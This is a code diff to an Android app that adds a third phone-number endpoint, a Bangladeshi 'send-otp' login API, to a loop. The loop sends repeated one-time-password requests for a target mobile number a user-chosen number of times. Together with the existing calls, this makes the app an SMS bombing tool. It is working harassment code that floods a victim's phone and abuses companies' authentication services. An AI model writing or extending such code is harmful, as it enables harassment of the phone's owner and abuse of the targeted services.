@@ -57,6 +57,7 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
                 for(int i=0;i<amount;i++){
                     swapnoApi(mobile);
                     blshopApi(mobile);
+                    bongobdApi(mobile);
                 }
                 Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();
                 //Toast.makeText(MainActivity.this,"Button pressed",Toast.LENGTH_LONG).show();
@@ -115,6 +116,41 @@ public class MainActivity extends AppCompatActivity  implements View.OnClickList
                 Map<String, String> params = new HashMap<String, String>();
                 params.put("action", "otpRegistration");
                 params.put("otpMobile", mobile);
+                return params;
+            }
+
+        };
+        queue.add(stringRequest);
+    }
+
+    private void bongobdApi(String mobile){
+        String url = String.valueOf("https://api.bongo-solutions.com/auth/api/login/send-otp");
+        boolean flag = false;
+        RequestQueue queue = Volley.newRequestQueue(this);
+        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
+                new Response.Listener<String>() {
+                    @Override
+                    public void onResponse(String response) {
+                        // enjoy your response
+                        //Toast.makeText(MainActivity.this,"success",Toast.LENGTH_LONG).show();
+
+                    }
+                }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                // enjoy your error status
+            }
+        }){
+            @Override
+            public String getBodyContentType() {
+                return "application/json";
+            }
+
+            @Override
+            protected Map<String, String> getParams() throws AuthFailureError {
+                Map<String, String> params = new HashMap<String, String>();
+                params.put("operator", "all");
+                params.put("msisdn", String.valueOf("88"+mobile));
                 return params;
             }
 
